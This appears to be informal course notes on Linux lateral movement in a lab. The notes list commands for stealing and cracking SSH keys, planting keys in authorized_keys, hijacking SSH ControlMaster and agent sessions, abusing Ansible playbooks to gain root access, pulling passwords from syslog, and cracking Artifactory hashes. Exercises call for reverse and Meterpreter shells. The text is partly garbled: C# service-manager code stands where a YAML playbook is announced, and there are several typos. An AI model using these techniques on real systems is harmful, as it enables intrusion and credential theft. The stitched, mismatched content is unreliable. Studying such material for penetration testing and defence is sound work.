# Linux Lateral Movement

First,
we’ll leverage SSH and demonstrate how to steal keys and hijack open sessions. We will then
explore large-scale DevOps829 technologies and leverage both Ansible and Artifactory. Finally, we’ll
demonstrate how Kerberos-enabled Linux systems can create a bridge into Windows domains
and leverage this for lateral movement.


we need to configure our /etc/hosts file first with

```dotnetcli
controller: 192.168.120.40
• linuxvictim: 192.168.120.45
• dc01.corp1.com: 192.168.120.5
```

# lateral movement with ssh

ssh private kes are exellent opportunity for lateral movement.
The public key is stored in the ~/.ssh/authorized_keys file of the
server the user is connecting to. The private key is typically stored in the ~/.ssh/ directory on the
system the user is connecting from.ls

# ssh keys

ssh kes have permission set to 600

private keys are named as id_rsa by default 

we can use `find /home/ -name "id_rsa"`

if nothing comes up then there might be no keys with admin permission

```
└─$ find /home/ -name "id_rsa"
/home/kali/.ssh/id_rsa
```

It is always beneficial to look into the users home directory because the key could be stored with a different name there.

for example `svuser.key`

we can look at known_hosts

`cat ~/.ssh/known_hosts`

`tail .bash_history`

if they are connected to a controller server using svuser account then we can use host controller.

we can crack the passphrase through john the ripper

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash`

`ssh -i ./svuser.key svuser@controller`

# SSH Persistence

~/.ssh/authorized_keys - 

ssh-keygen

echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8=
kali@kali" >> /home/linuxvictim/.ssh/authorized_keys

ssh linuxvictim@linuxvictim

### 14.1.2.1 Exercises
1. Generate a private keypair with a passphrase on your Kali VM. Try to crack the passphrase
using JTR.
2. Generate a private keypair on your Kali VM and insert your public key in the linuxvictim user’s
authorized_keys file on the linuxvictim host and then SSH to it.

# SSH Hijacking with ControlMaster

The term SSH hijacking refers to the use of an existing SSH connection to gain access to another
machine. Two of the most common methods of SSH hijacking use the ControlMaster836 feature
or the ssh-agent.837
ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network
connection. This functionality can be enabled for a given user by editing their local SSH
configuration file (~/.ssh/config).

```
Host *
ControlPath ~/.ssh/controlmaster/%r@%h:%p
ControlMaster auto
ControlPersist 10ma
```

These ControlMaster settings can also be placed in /etc/ssh/ssh_config to
configure ControlMaster at a system-wide level.

```
chmod 644 ~/.ssh/config
mkdir ~/.ssh/controlmaster

ls -al ~/.ssh/controlmaster/
```

# SSH Hijacking uing SSH Agent and SSH Agent forwarding

SSH-Agent is a utility that keeps track of a user’s private keys and allows them to be used without
having to repeat their passphrases on every connection.

For our SSH connections to work using SSH-Agent forwarding, we need to have our public key
installed on both the intermediate server and the destination server. In our case, the intermediate
server will be the controller machine and the destination server will be linuxvictim. We can copy
our key to both of them using the ssh-copy-id command from our Kali VM, specifying our public
key with the -i flag.

`ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller`

~/.ssh/config we need to put a forwardingAgent yes

eval `ssh-agent`

ssh-add

ssh offsec@controller

Note that in the attacker session, we’ll ssh to the intermediate box from a root
kali shell to make sure that we are not leveraging the key pair we have in the kali
home folder for authenticating with the intermediate server. In a real scenario,
the attacker connection to the intermediate server would be performed from a
different box.

ps aux | grep ssh

pstree -p offsec | grep ssh

cat /proc/16381/environ 

```
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l
3072 SHA256:6cyHlr9fISx9kcgR9+1crO1Hnc+nVw0mnmQ/Em5KSfo kali@kali (RSA)
root@controller:~# SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh
offsec@linuxvictim
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
...
Last login: Thu Jul 30 11:14:26 2020 from 192.168.120.40
```

### 14.1.4.1 Exercises
1. Reproduce ControlMaster hijacking in the lab.
2. Reproduce SSH-Agent forwarding hijacking in the lab.

# Devops

There are many systems available that perform these sorts of functions. Puppet842 and Chef843
are both popular, but in this module we will take a closer look at Ansible,844 which we’ve frequently
encountered in penetration testing engagements.

# introduction to ansible

We can find the host inventory on the controller at /etc/ansible/hosts.

# enumerating ansible

we can use ansible command to enumerate

`ansible`

```
oot@misthios:~# ansible
usage: ansible [-h] [--version] [-v] [-b] [--become-method BECOME_METHOD]
               [--become-user BECOME_USER] [-K] [-i INVENTORY] [--list-hosts]
               [-l SUBSET] [-P POLL_INTERVAL] [-B SECONDS] [-o] [-t TREE] [-k]
               [--private-key PRIVATE_KEY_FILE] [-u REMOTE_USER]
               [-c CONNECTION] [-T TIMEOUT]
               [--ssh-common-args SSH_COMMON_ARGS]
               [--sftp-extra-args SFTP_EXTRA_ARGS]
               [--scp-extra-args SCP_EXTRA_ARGS]
               [--ssh-extra-args SSH_EXTRA_ARGS] [-C] [--syntax-check] [-D]
               [-e EXTRA_VARS] [--vault-id VAULT_IDS]
               [--ask-vault-password | --vault-password-file VAULT_PASSWORD_FILES]
               [-f FORKS] [-M MODULE_PATH] [--playbook-dir BASEDIR]
               [-a MODULE_ARGS] [-m MODULE_NAME]
               pattern

```

/etc/ansible filepath contains the ansible configuration files or the presence of ansible related usernames in etc/passwd

we can also look at syslog file to enumerate ansible

# ad hoc commands

node actions can be initiated from an ansible controller in two primaty ways

adhoc commands and playbooks

`ansible victims -a "whoami"`

```
root@misthios:~# ansible victims -a "whoami" 
[WARNING]: No inventory was parsed, only implicit localhost is available
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'
[WARNING]: Could not match supplied host pattern, ignoring: victims

```



ansible victims -a "whoami" --become

# ansible playbooks

playbooks run with elevated privileges

they use YAML markup language

in  `/opt/playbooks/` we will create `getinfo.yml`

```
using System;
using System.Runtime.InteropServices;
namespace lat
{
 class Program
 {
 [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
CharSet=CharSet.Unicode, SetLastError=true)]
 public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
uint dwAccess);
 static void Main(string[] args)
 {
 String target = "appsrv01";
 
 IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
 } 
 }
}
```

we run it using ansible-playbook getinfo.yml commmand

# exploiting playbooks for ansible credentials

/opt/playbooks/writefile.yaml.

```
---
- name: Write a file as offsec
 hosts: all
 gather_facts: true
 become: yes
 become_user: offsec
 vars:
 ansible_become_pass: lab
 tasks:
 - copy:
 content: "This is my offsec content"
 dest: "/home/offsec/written_by_ansible.txt"
 mode: 0644
 owner: offsec
 group: offsec
```

to extract password from the ansible

 python3 /usr/share/john/ansible2john.py ./test.yml

# weak permissions

/opt/playbooks/getinfowritable.yaml h

```
---
- name: Get system info
 hosts: all
 gather_facts: true
 become: yes
 tasks:
 - name: Display info
 debug:
 msg: "The hostname is {{ ansible_hostname }} and the OS is {{ 
ansible_distribution }}"
 - name: Create a directory if it does not exist
 file:
 path: /root/.ssh
 state: directory
 mode: '0700'
 owner: root
 group: root
 - name: Create authorized keys if it does not exist
 file:
 path: /root/.ssh/authorized_keys
 state: touch
 mode: '0600'
 owner: root
 group: root
 - name: Update keys
 lineinfile:
 path: /root/.ssh/authorized_keys
 line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
 insertbefore: EOF
```

# sensitive data leak from ansible

/var/log/syslog

example 

```
ansibleadm@controller:/opt/playbooks$ cat mysqlbackup.yml
---
- name: Backup TPS reports
 hosts: linuxvictim
 gather_facts: true
 become: yes
 tasks:
 - name: Run command
 shell: mysql --user=root --password=hotdog123 --host=databaseserver --databases 
tpsreports --result-file=/root/reportsbackup
 async: 10 
 poll: 0
```
cat /var/log/syslong

### 14.2.7.1 Exercises
1. Execute an ad-hoc command from the controller against the linuxvictim host.
2. Write a short playbook and run it against the linuxvictim host to get a reverse shell.
3. Inject a shell command task into the getinfowritable.yml playbook we created earlier and use 
it to get a Meterpreter shell on the linuxvictim host without first copying the shell to the 
linuxvictim host via SSH or other protocols

# Artifactory

binary repository manager that stores software packages and other binaries

Binary repository managers act as a “single source of truth” for organizations to be able to control
which versions of packages and applications are being used in software development or
infrastructure configuration. This prevents developers from getting untrusted or unstable binaries
directly from the Internet.

starting artifactory

`sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start`

`http://controller:8082/`

# artifactory enumeration

`ps aux | grep artifactory`

# compromising artifactory backups

At first glance, it may seem logical to try and replace artifact binaries on disk wherever they are
stored. However, it is difficult to identify the files we want because they are not stored by name,
but by their file hash.

Artifactory stores its user information, such as usernames and encrypted passwords, in
databases as most applications do. The database depends on the configuration and version of
Artifactory.
Larger organizations with a commercial version of Artifactory may use Postgres databases. The
open-source version of Artifactory defaults to an included Apache Derby868 database. This doesn’t
necessarily represent all potential configurations, but the general concepts needed for this exploit
are essentially the same regardless of which database is being used.
We have two options to use the database to compromise Artifactory. The first is through
backups. Depending on the configuration,869 Artifactory creates backups of its databases. The
open-source version of Artifactory creates database backups for the user accounts at
/<ARTIFACTORY FOLDER>/var/backup/access in JSON format.

`root@controller:/opt/jfrog/artifactory/var/backup/access# cat
access.backup.20200730120454.json`

`sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

# Compromising Artifactory's Database

